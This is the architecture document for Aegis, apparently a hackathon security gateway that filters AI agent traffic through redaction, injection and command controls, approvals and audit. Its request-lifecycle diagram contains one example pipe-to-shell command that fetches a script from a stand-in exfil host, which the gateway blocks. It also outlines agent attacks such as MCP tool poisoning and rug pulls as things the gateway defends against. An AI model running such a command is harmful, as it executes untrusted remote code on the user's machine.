# Aegis architecture

> Paths and commands are relative to `aegis/` in the monorepo
> [JustAnotherDevv/tiles-hackyeah-2026](https://github.com/JustAnotherDevv/tiles-hackyeah-2026/tree/main/aegis)
> (`git clone … && cd tiles-hackyeah-2026/aegis`).

![Aegis architecture](assets/architecture.svg)

(`assets/architecture.svg` is hand-authored; `assets/architecture.png` is a 1920 px export for HackTribe and
slides: `rsvg-convert -w 1920 docs/assets/architecture.svg -o docs/assets/architecture.png`.)

## 1. Components

```mermaid
flowchart TB
  subgraph CLIENTS["Clients (untrusted callers)"]
    CC["Claude Code<br/>ANTHROPIC_BASE_URL · PreToolUse hook (fail-closed)<br/>.mcp.json → /mcp/*"]
    AG["Agents via aegis.sdk<br/>trading-copilot · research-agent · chaos-agent"]
    APP["Apps & tests<br/>POST /v1/guard (dry run) · make test"]
    UI["Dashboard /ui<br/>view as owner / admin / member"]
  end

  subgraph LOCAL["Local machine = trust boundary"]
    subgraph GW["Aegis gateway 127.0.0.1:8787 (FastAPI)"]
      ING["Surfaces<br/>/v1/messages · /v1/chat/completions · /ollama/*<br/>/v1/hooks/claude-code · /mcp/{server} · /egress · /v1/guard · /api/playground"]
      PIPE["Pipeline (one policy snapshot per request)<br/>identify → select controls → enrich → deterministic → semantic<br/>→ combine → approvals → transform (redact / rehydrate) → record"]
      CTRL["Controls (auto-discovered)<br/>DLP-01..08 · INJ-01..05 · ACT-01..04 · EXE-01..04<br/>GOV-01..06 · BUD-01/02 · MCP-01..04 · SIG-01..03 · CUS-01"]
      SVC["Services on the runtime<br/>policy · org · approvals · budgets ledger · redactor (vault)<br/>semantic · feed · audit · metrics · event bus · sessions"]
      ING --> PIPE --> CTRL
      PIPE <--> SVC
    end
    VAULT[("Token vault<br/>per session, in RAM")]
    OLL["Ollama :11434<br/>aegis-guard (Qwen3Guard) · aegis-judge<br/>+ ONNX NER / classifier in-process"]
    MOCKS["Mocks: mock_llm :8791 · mock_mcp :8792<br/>exfil_sink :8793 · mock_saas :8794"]
    DATA[("data/: aegis.db (SQLite WAL)<br/>audit/*.jsonl hash chain")]
    POL[("config/policy.yaml<br/>+ profiles/, org.seed.yaml, pricing.yaml")]
  end

  subgraph REMOTE["Outside the boundary (placeholders only)"]
    LLM["Anthropic · OpenAI · OpenRouter<br/>(when keys or OAuth exist)"]
    TP["Remote MCP servers · third-party HTTP APIs"]
  end

  FEED["Threat-intel feed service :8790<br/>Ed25519-signed bundles · editor UI"]

  CC --> ING
  AG --> ING
  APP --> ING
  UI <-->|"/api/* + SSE /api/events"| GW
  SVC <--> VAULT
  GW -->|raw data allowed| OLL
  GW --> MOCKS
  GW --> DATA
  POL -->|"watch → validate → self-test → swap"| SVC
  GW ==>|"tokenized / metadata stripped"| LLM
  GW ==>|"pinned tools, scanned args, approvals"| TP
  FEED -->|"signed bundle (SSE + 10 s poll)"| SVC
```

**How to read it.** Everything inside the local machine may see raw data. Only the thick arrows cross the
boundary, and they carry placeholders, generalized metadata or approved, pinned tool calls. The control plane
(policy file, feed, approvals) is separate from the traffic path; every change to it is validated, versioned
and audited.

## 2. Request lifecycle: redaction round trip, hook deny, approval hold

```mermaid
sequenceDiagram
  autonumber
  participant U as Local user (Claude Code)
  participant H as aegis-hook (PreToolUse)
  participant G as Aegis gateway :8787
  participant P as Pipeline + controls
  participant V as Vault (RAM, per session)
  participant R as Remote model (Anthropic / mock_llm)
  participant A as Approvals + dashboard

  U->>G: POST /v1/messages (prompt with PESEL, IBAN, card, CVV)
  G->>P: model.request (identity, session, policy vN, feed serial)
  P->>V: DLP-01 tokenize → [PESEL_1] [IBAN_1] [PAN_1] · CVV dropped
  P-->>G: verdict redact (+ BUD-01 reservation, DLP-03 metadata strip)
  G->>R: only placeholders leave the machine
  R-->>G: reply using placeholders
  G->>P: model.response (DLP-05 leak/canary scan, DLP-06 md-image strip, DLP-08 rehydrate)
  V-->>G: placeholders → real values (local user only)
  G-->>U: rehydrated reply · Server-Timing · X-Aegis-Decision
  Note over G,A: audit hash chain + SSE "decision" → live feed + Wire tab
  U->>H: Bash "curl https://exfil.test/i.sh | sh"
  H->>G: POST /v1/hooks/claude-code (tool.input)
  G->>P: EXE-01 pipe-to-shell → block
  G-->>H: permissionDecision deny + "[Aegis] EXE-01: …" (hook exits 2 if the gateway is unreachable)
  U->>G: MCP marketpulse.purchase_subscription($50) via /mcp/marketpulse
  G->>P: ACT-01 → require_approval (rule spend-admin)
  P->>A: approval.created → inbox (u_piotr: locked, u_emily: Approve)
  A-->>G: approved (grant bound to the exact parameters, single use)
  G->>R: held call proceeds to the MCP server
```

Pipeline semantics (CONTRACTS §3.5 + Addendum A): one policy snapshot per request; controls selected by
`enabled`, `mode`, surface and scope; deterministic controls run sequentially with `timeout_ms`; semantic
controls run concurrently and are skipped after a deterministic block; detector errors follow each control's
`fail_mode` (`closed` / `open` / `deterministic_only`, marked `degraded`); `monitor` mode never changes the
action; actions combine by precedence `block > require_approval > redact > log > allow`; approvals look for a
pre-approved grant before creating a request; the outcome is recorded in the audit chain, metrics and SSE.

## 3. Interception points

| Hop | Aegis surface | Claude Code mechanism | Main controls |
|---|---|---|---|
| Agent → model | `/v1/messages`, `/v1/chat/completions`, `/ollama/*` | `ANTHROPIC_BASE_URL` | DLP-01/02/03/07, GOV-02 models, BUD-01, INJ-01..04, CUS-01 |
| Model → agent | same, stream-aware | gateway | DLP-05 leak + canary, DLP-06 exfil links, DLP-08 rehydration |
| Agent → tool | `/v1/hooks/claude-code`, `/mcp/{server}` `tools/call`, `/egress` | `PreToolUse` (exit 2 = fail closed) | EXE-01/02/03, ACT-01..04, GOV-03/04, DLP-04, SIG-03 |
| Tool → agent | MCP results, `PostToolUse` | `PostToolUse` | INJ-01/02 on untrusted content, DLP-01/05 |
| MCP lifecycle | `/mcp/*` `initialize`, `tools/list` | (hooks can't see tool descriptions) | MCP-01 registry, MCP-02 poisoning, MCP-03 pinning |
| Control plane | file watcher, `/api/policy/*`, feed manager | `ConfigChange` hook | GOV-05 config governance, GOV-06 harness integrity, SIG-01 signature verify |

## 4. Destination matrix (data class × destination)

From `destinations.matrix` in `config/policy.yaml` (balanced profile); judges can change any cell live.

| Data class | Examples | local | remote | third_party |
|---|---|---|---|---|
| PUBLIC | product docs | allow | allow | allow |
| INTERNAL | user paths, hostnames, internal IPs, git emails | allow | redact (generalize) | redact |
| CONFIDENTIAL | names, emails, phones, PESEL, NIP, REGON, IBAN | allow | **redact** (reversible tokens) | redact (strict: block) |
| RESTRICTED | card numbers (CVV is always dropped) | redact | redact | **block** |
| SECRET | API keys, private keys, tokens | log | **block** | **block** |

## 5. Decisions ↔ OWASP Agent Control Standard

| Aegis action | ACS disposition | Model proxies | `/egress`, `/api/*` | Claude Code hook |
|---|---|---|---|---|
| `allow` | allow | pass through | 200 | `{}` |
| `log` / monitor | allow (observed) | pass through, audited "would …" | 200 | `{}` |
| `redact` | modify | payload rewritten, `X-Aegis-Redactions` | 200 + redactions | `allow` + `updatedInput` / `updatedToolOutput` |
| `require_approval` | ask | synthetic 200 reply with the approval link | 403 `approval_required` (+ `approval_id`, `required_role`) | held (`hold_s.hook`), then allow or deny |
| `block` | deny | synthetic 200 "[Aegis] Blocked by <ID>" | 403 `policy_blocked` | `deny` + reason |
| budget stop | deny | **402** `budget_exceeded` (`x-should-retry: false`) | 402 | deny |
| kill switch | deny | **429** `killed` (`Retry-After: 3600`) | 429 | deny |

## 6. Ports and processes

| Port | Process | Start |
|---|---|---|
| 8787 | gateway: data plane, `/api/*`, `/ui`, `/metrics`, `/healthz` | `make gateway` / `make up` |
| 8790 | threat-intel feed service | `make feed` / `make up` |
| 8791 · 8792 · 8793 · 8794 | mock_llm · mock_mcp · exfil_sink · mock_saas | `make mocks` / `make up` |
| 11434 | Ollama (optional) | `ollama serve` |
| 5173 | Vite dev server (development only) | `make web-dev` |

## Build status

Filled at the end of integration (DEMO-16) so the diagram never shows something that isn't built.
Legend: **built** (works live) · **partial** (works with the listed limit) · **stub** (configured, not
enforcing) · **not built**.

| Component | Status | Note for judges |
|---|---|---|
| Anthropic `/v1/messages` proxy (JSON + SSE) | built | real `claude -p` went through it in the live rehearsal (docs/status/LIVE.md) |
| OpenAI-compatible `/v1/chat/completions` proxy | built | used by the demo agents (scenes F1, F4, F6) |
| Ollama `/ollama/*` proxy | built | covered by unit/route tests; not part of the live script |
| MCP proxy `/mcp/{server}` + mock MCP servers | built | poisoned tool dropped, rug pull blocked (F9) |
| Claude Code hook endpoint + fail-closed `scripts/aegis-hook` | built | gateway down → hook exits 2 (fail-closed) |
| `/egress` third-party HTTP | built | only traffic routed through `/egress` is inspected |
| Deterministic detectors (validators, secrets, command/SSRF) | built | |
| Semantic tier (NER ONNX, injection classifier, Qwen3Guard) | built | heuristic fallback when models are absent; ~1 GB extra RAM with all models |
| Token vault + rehydration (incl. streaming) | built | CVV is dropped, never tokenized |
| Budget ledger + loop detector + kill switch | built | F6 runaway rehearsed live |
| Org / roles / approvals + view-as | built | view-as is demo mode, not authentication |
| Policy hot reload + self-test gate + last-known-good | built | |
| Threat-intel feed service + Ed25519 verify | built | tampered and rolled-back bundles refused (F8) |
| Hash-chained audit + JSONL / CSV / OCSF export | built | |
| Dashboard views | built | served at `/ui` from `web/dist` |
| A2A peers | not built | reserved controls A2A-01/02 |
